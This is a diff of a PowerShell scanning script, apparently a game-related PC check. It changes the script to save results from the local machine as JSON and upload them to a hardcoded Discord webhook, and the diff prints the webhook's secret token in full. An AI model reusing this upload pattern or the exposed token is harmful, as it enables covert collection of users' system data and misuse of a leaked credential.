@@ -106,30 +106,33 @@ if (Test-Path $ubisoftPath) {
     Write-Host "Ubisoft savegames folder not found."
 }
 
-# === DISCORD WEBHOOK SECTION ===
-
 # Webhook URL
 $webhookUrl = "https://discord.com/api/webhooks/1384662840430035086/sNa0cdVGIYrKmFiAmw7LdqjpWbWOGMValOwVICoB8Pc0tcpZFBnGhaVs4HH3ybjuadsi"
 
-# Save results to file
-$reportFile = "$env:TEMP\scan_results.txt"
-$Z -join "`r`n" | Out-File -FilePath $reportFile -Encoding UTF8
+# Save original scan results (assuming $Z is a list/array of strings)
+$rawFile = "$env:TEMP\scan_results.txt"
+$Z -join "`r`n" | Out-File -FilePath $rawFile -Encoding UTF8
 
-# Send normal message
+# Convert to JSON and save to new file
+$jsonFile = "$env:TEMP\scan_results.json"
+$Z | ConvertTo-Json -Depth 10 | Out-File -FilePath $jsonFile -Encoding UTF8
+
+# Send a plain message to let the user know
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{
-    content = "Scan results"
+    content = "Scan results (JSON format)"
 } -ContentType 'application/x-www-form-urlencoded'
 
-# Send file as embed
+# Send JSON file with embed
 $multipartForm = @{
-    file = Get-Item $reportFile
+    file = Get-Item $jsonFile
     payload_json = (@{
         embeds = @(@{
-            title = "Scan Report"
-            description = "Attached is the scan results from the PowerShell script."
-            color = 16711680  # Red
+            title = "Scan Report (JSON)"
+            description = "Attached is the scan result in JSON format."
+            color = 65280  # Green
         })
     } | ConvertTo-Json -Depth 10)
 }
 
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Form $multipartForm
+
